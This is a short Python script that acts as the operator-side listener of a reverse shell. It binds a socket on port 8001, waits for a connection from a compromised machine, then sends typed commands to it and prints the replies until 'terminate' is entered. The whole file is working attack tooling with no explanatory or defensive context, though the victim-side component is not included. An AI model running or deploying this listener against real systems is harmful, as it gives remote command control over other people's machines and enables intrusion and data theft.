
import socket


def create_reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 8001
    s.bind(("localhost", port))
    s.listen(1)
    print (f'[+] Listening for incoming TCP connection on port {port}')
    conn, addr = s.accept()
    print ('[+] We got a connection from: ', addr)

    while True:
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        else:
            conn.send(command.encode())
            print (conn.recv(1024).decode())
